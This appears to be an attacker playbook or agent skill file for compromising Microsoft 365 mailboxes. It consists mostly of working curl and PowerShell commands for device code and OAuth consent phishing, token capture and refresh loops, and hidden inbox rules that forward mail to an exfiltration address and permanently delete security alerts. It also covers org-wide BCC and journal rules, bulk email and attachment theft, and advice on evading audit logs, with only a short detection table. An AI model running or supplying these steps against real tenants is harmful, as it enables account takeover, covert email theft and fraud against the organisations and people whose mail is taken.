---
name: m365-mailbox-compromise
description: "Microsoft 365 mailbox compromise chain — OAuth consent phishing, delegate access abuse, mail rule persistence, and token theft via device code phishing. Full kill chain from initial access to persistent email collection."
metadata:
  subdomain: cloud
  when_to_use: "m365 microsoft 365 office 365 mailbox compromise oauth consent phishing device code phishing delegate access mail rule forwarding application impersonation exchange online token theft email collection outlook graph api"
  mitre_attack: "T1528, T1098.002, T1114.002, T1137"
  tags: "cloud m365 oauth phishing email-collection persistence"
---

# Microsoft 365 Mailbox Compromise

Targets Microsoft 365 tenants through OAuth consent grants, device code phishing, delegate access abuse, and mail flow rule persistence. Provides silent, persistent email collection that survives password resets and MFA changes.

## Quick Reference

```bash
# Device code phishing — initiate auth flow
curl -s "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=offline_access Mail.Read Mail.ReadWrite"

# Poll for token after victim enters code
curl -s "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&device_code=<DEVICE_CODE>"

# List mailbox messages via Graph API
curl -s "https://graph.microsoft.com/v1.0/me/messages?\$top=50&\$select=subject,from,receivedDateTime" \
  -H "Authorization: Bearer <ACCESS_TOKEN>" | jq '.value[] | {subject,from,receivedDateTime}'

# Create inbox forwarding rule
curl -s -X POST "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \
  -H "Authorization: Bearer <ACCESS_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"","isEnabled":true,"sequence":1,"conditions":{"subjectContains":["invoice","payment","wire","transfer"]},"actions":{"forwardTo":[{"emailAddress":{"address":"<EXFIL_EMAIL>"}}]}}'
```

## MITRE ATT&CK Mapping

| Technique | ID | Application |
|---|---|---|
| Steal Application Access Token | T1528 | OAuth consent grant or device code phishing for Graph API tokens |
| Additional Email Delegate Permissions | T1098.002 | Add mailbox delegate or ApplicationImpersonation role |
| Remote Email Collection | T1114.002 | Exfiltrate mail via Graph API or EWS |
| Office Application Startup | T1137 | Outlook rules, forms, and home page for persistence |
| Phishing: Spearphishing Link | T1566.002 | OAuth consent phishing URL delivery |
| Account Manipulation | T1098 | Mail flow rule creation for persistent forwarding |

## 1. OAuth Consent Grant Phishing

### Craft Malicious OAuth Application
```bash
# Register app in attacker-controlled Azure AD tenant
# Azure Portal → App Registrations → New Registration
# Redirect URI: https://<ATTACKER_DOMAIN>/callback
# Request permissions: Mail.Read, Mail.ReadWrite, Contacts.Read, Files.Read

# Build consent URL — victim clicking grants access
CONSENT_URL="https://login.microsoftonline.com/common/adminconsent?client_id=<MALICIOUS_APP_ID>&redirect_uri=https://<ATTACKER_DOMAIN>/callback&scope=https://graph.microsoft.com/.default"

# For user-level consent (no admin required):
USER_CONSENT="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<MALICIOUS_APP_ID>&response_type=code&redirect_uri=https://<ATTACKER_DOMAIN>/callback&scope=Mail.Read+Mail.ReadWrite+offline_access&response_mode=query"

# After victim consents, exchange auth code for tokens
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=<MALICIOUS_APP_ID>&client_secret=<APP_SECRET>&code=<AUTH_CODE>&redirect_uri=https://<ATTACKER_DOMAIN>/callback&grant_type=authorization_code"
```

### Evasion: Disguise the Application
```bash
# Name the app to look legitimate:
#   "Microsoft Security Update"
#   "IT Helpdesk Portal"
#   "SharePoint Document Viewer"
# Use a publisher domain similar to target org
# Request minimal permissions initially, escalate later via incremental consent
```

## 2. Device Code Phishing

```bash
# Step 1: Generate device code (no victim interaction yet)
RESP=$(curl -s "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=offline_access Mail.Read Mail.ReadWrite Mail.Send User.Read")

DEVICE_CODE=$(echo "$RESP" | jq -r '.device_code')
USER_CODE=$(echo "$RESP" | jq -r '.user_code')
VERIFY_URL=$(echo "$RESP" | jq -r '.verification_uri')
echo "Send victim to: $VERIFY_URL and enter code: $USER_CODE"

# Step 2: Send phishing message directing victim to https://microsoft.com/devicelogin
# Pretext: "MFA re-enrollment required" / "Security verification" / "Teams meeting access"

# Step 3: Poll for token completion (victim enters code and authenticates)
while true; do
  TOKEN_RESP=$(curl -s "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&device_code=$DEVICE_CODE")
  
  if echo "$TOKEN_RESP" | jq -e '.access_token' > /dev/null 2>&1; then
    echo "$TOKEN_RESP" | jq '{access_token,refresh_token,expires_in}' > /tmp/m365_tokens.json
    echo "[+] Token captured!"
    break
  fi
  sleep 5
done

# Step 4: Use refresh token for persistent access (survives password change)
REFRESH_TOKEN=$(jq -r '.refresh_token' /tmp/m365_tokens.json)
curl -s "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&scope=offline_access Mail.Read Mail.ReadWrite"
```

## 3. ApplicationImpersonation & Delegate Access

```bash
# If Exchange admin access is obtained:

# Grant ApplicationImpersonation role (access ANY mailbox)
# PowerShell via Graph/EWS:
# New-ManagementRoleAssignment -Role "ApplicationImpersonation" -User "<COMPROMISED_ADMIN>"

# Add mailbox delegate (victim won't see in Outlook UI easily)
curl -s -X POST "https://graph.microsoft.com/v1.0/users/<VICTIM_UPN>/mailFolders/inbox/permissions" \
  -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"emailAddress":{"address":"<ATTACKER_UPN>"},"role":"read"}'

# Full mailbox access via EWS impersonation
curl -s "https://outlook.office365.com/EWS/Exchange.asmx" \
  -H "Content-Type: text/xml" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:ExchangeImpersonation>
      <t:ConnectingSID><t:PrimarySmtpAddress><VICTIM_EMAIL></t:PrimarySmtpAddress></t:ConnectingSID>
    </t:ExchangeImpersonation>
  </soap:Header>
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape><t:BaseShape>Default</t:BaseShape></m:ItemShape>
      <m:ParentFolderIds><t:DistinguishedFolderId Id="inbox"/></m:ParentFolderIds>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>'

# Grant full access to mailbox via PowerShell
# Add-MailboxPermission -Identity <VICTIM> -User <ATTACKER> -AccessRights FullAccess -AutoMapping $false
# AutoMapping:$false prevents it from showing in Outlook — stealthier
```

## 4. Mail Rule Persistence

### Inbox Rules via Graph API
```bash
# Create hidden forwarding rule
curl -s -X POST "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": " ",
    "sequence": 1,
    "isEnabled": true,
    "conditions": {
      "bodyContains": ["password","credential","vpn","token","secret","wire","invoice","payment"]
    },
    "actions": {
      "forwardTo": [{"emailAddress":{"address":"<EXFIL_EMAIL>"}}],
      "markAsRead": true,
      "moveToFolder": "inbox"
    }
  }'

# Create rule that deletes security alerts (cover tracks)
curl -s -X POST "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": " ",
    "sequence": 2,
    "isEnabled": true,
    "conditions": {
      "fromContains": ["security@","noreply@microsoft","alerts@"]
    },
    "actions": {
      "delete": true,
      "permanentDelete": true
    }
  }'

# List existing rules (check for defender-created rules)
curl -s "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \
  -H "Authorization: Bearer <TOKEN>" | jq '.value[] | {displayName,isEnabled,conditions,actions}'
```

### Transport/Mail Flow Rules (Admin-Level)
```bash
# Exchange admin: create org-wide BCC rule
# New-TransportRule -Name "Compliance Journaling" -SentToScope InOrganization \
#   -BlindCopyTo "<EXFIL_EMAIL>" -SubjectContainsWords "confidential","acquisition","merger"

# Journal rule (copies ALL mail to external address)
# New-JournalRule -Name "Legal Hold" -JournalEmailAddress "<EXFIL_EMAIL>" \
#   -Scope Global -Enabled $true
```

## 5. Email Collection & Exfiltration

```bash
# Bulk email download via Graph API
ACCESS_TOKEN="<TOKEN>"

# Search for high-value emails
curl -s "https://graph.microsoft.com/v1.0/me/messages?\$search=\"password OR credential OR vpn OR secret\"&\$top=100&\$select=subject,from,body,hasAttachments,receivedDateTime" \
  -H "Authorization: Bearer $ACCESS_TOKEN" > /tmp/m365_search.json

# Download all attachments
curl -s "https://graph.microsoft.com/v1.0/me/messages?\$filter=hasAttachments eq true&\$top=50" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[].id' | while read msgid; do
  curl -s "https://graph.microsoft.com/v1.0/me/messages/$msgid/attachments" \
    -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[] | .name + " " + .contentBytes' >> /tmp/m365_attachments.txt
done

# Access other users' mailboxes (with ApplicationImpersonation)
curl -s "https://graph.microsoft.com/v1.0/users/<VICTIM_UPN>/messages?\$top=50" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {subject,from}'

# OneDrive/SharePoint access with same token (if scoped)
curl -s "https://graph.microsoft.com/v1.0/me/drive/root/children" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {name,size,lastModifiedDateTime}'
```

## 6. Token Refresh & Long-Term Persistence

```bash
# Refresh tokens last 90 days by default (can be revoked)
# Keep refreshing before expiry to maintain access indefinitely

# Automated token refresh loop
REFRESH_TOKEN=$(jq -r '.refresh_token' /tmp/m365_tokens.json)
NEW_TOKENS=$(curl -s "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&scope=offline_access Mail.Read Mail.ReadWrite")
echo "$NEW_TOKENS" > /tmp/m365_tokens.json

# Check token validity
curl -s "https://graph.microsoft.com/v1.0/me" \
  -H "Authorization: Bearer $(jq -r '.access_token' /tmp/m365_tokens.json)" | jq '{displayName,mail,userPrincipalName}'

# If refresh token is revoked, fall back to:
# 1. Consent grant still active → re-authenticate via consent URL
# 2. Mail forwarding rules still active → passive collection continues
# 3. Delegate permissions still active → access via different compromised account
```

## Tools & Resources

| Tool | Purpose |
|---|---|
| TokenTactics (PowerShell) | Device code phishing and token manipulation |
| AADInternals | Azure AD / M365 enumeration and abuse |
| ROADtools | Azure AD data collection and analysis |
| GraphRunner | Graph API post-exploitation framework |
| Mailsniper | Exchange/M365 mailbox enumeration |
| o365creeper | M365 user enumeration via ActiveSync |
| Hawk | M365 forensic log analysis (know your enemy) |

## Detection Signatures

| Indicator | Detection Method |
|---|---|
| OAuth consent grant to unknown app | Azure AD sign-in logs: `ConsentGrant` activity |
| Device code flow from unusual IP | Azure AD: `DeviceCodeFlow` auth event with risky IP |
| ApplicationImpersonation role assignment | Unified Audit Log: `New-ManagementRoleAssignment` |
| Inbox rule with external forwarding | Exchange audit: `New-InboxRule` with `ForwardTo` external |
| Mail flow rule with BCC to external | Exchange admin audit: `New-TransportRule` |
| Graph API bulk message access | Azure AD sign-in: high-volume `Mail.Read` scoped token usage |
| Delegate mailbox access added | Exchange audit: `Add-MailboxPermission` with `FullAccess` |
| Refresh token from new device/IP | Azure AD: continuous access evaluation (CAE) alerts |

## Error Handling & Edge Cases

- **Consent blocked by admin policy**: Target tenants with `User.ReadWrite.All` admin consent required; use device code flow instead — it uses first-party Microsoft client IDs
- **Conditional Access Policy blocks token**: Some CAs require compliant device; device code flow from attacker machine may be blocked — chain with compromised endpoint
- **Refresh token revoked**: Fall back to active mail rules or delegate access; these persist independently of token state
- **Audit logs enabled**: Operate during business hours; blend Graph API calls with legitimate patterns; use first-party client IDs to avoid suspicious app registrations
- **MFA on target account**: Device code phishing bypasses MFA — victim authenticates with their MFA; token captured post-authentication
- **Mailbox audit logging**: Modern M365 enables mailbox auditing by default; minimize API calls, use `$select` to reduce logged scope

## Decision Gate

```
IF initial access to M365 account:
  → Deploy inbox forwarding rule for passive collection
  → Create hidden mail rule matching high-value keywords
  → Exfiltrate recent email via Graph API search
  → Refresh token on schedule to maintain access

IF Exchange admin access:
  → Grant ApplicationImpersonation for cross-mailbox access
  → Create transport rule for org-wide BCC
  → Target executive/finance mailboxes specifically

IF no credentials but phishing opportunity:
  → Device code phishing (bypasses MFA, uses legitimate Microsoft URL)
  → Fallback: OAuth consent grant phishing (requires app registration)
  → Last resort: credential phishing (less effective with MFA)

IF access is detected/revoked:
  → Mail rules persist after password reset — check if still forwarding
  → Delegate permissions persist after token revocation — re-authenticate
  → OAuth consent grants persist until explicitly revoked by admin
```
